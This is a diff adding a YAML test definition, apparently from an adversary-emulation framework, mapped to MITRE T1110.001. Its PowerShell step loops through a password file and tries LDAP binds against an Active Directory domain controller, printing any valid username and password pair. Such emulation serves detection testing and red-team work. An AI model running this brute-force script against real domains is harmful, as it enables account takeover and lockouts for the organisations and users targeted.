@@ -1,0 +1,57 @@
+api_version: "2.0"
+name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
+description: |
+    Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos
+args:
+    - name: user
+      type: string
+      default: $ENV:USERNAME
+    - name: passwords_path
+      type: path
+      default: PathToAtomicsFolder\T1110.001\src\passwords.txt
+    - name: domain
+      type: string
+      default: $env:UserDnsDomain
+    - name: auth
+      type: string
+      default: NTLM
+uuid: c2969434-672b-4ec8-8df0-bbb91f40e250
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.001: Password Guessing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-(ntlm-or-kerberos)
+      inline: |
+        if ("{{.Args.auth}}".ToLower() -NotIn @("ntlm","kerberos")) {
+          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+          exit 1
+        }
+
+        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("{{.Args.domain}}",389)
+
+        $passwordList = Get-Content -Path "{{.Args.passwords_path}}"
+        foreach ($password in $passwordList){
+          $credz = new-object System.Net.NetworkCredential("{{.Args.user}}", $password, "{{.Args.domain}}")
+          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::{{.Args.auth}})
+          try {
+            Write-Host " [-] Attempting ${password} on account {{.Args.user}}."
+            $conn.bind()
+            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+            Write-Host " [!] {{.Args.user}}:${password} are valid credentials!"
+          } catch {
+            Write-Host $_.Exception.Message
+          }
+        }
+        Write-Host "End of bruteforce"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
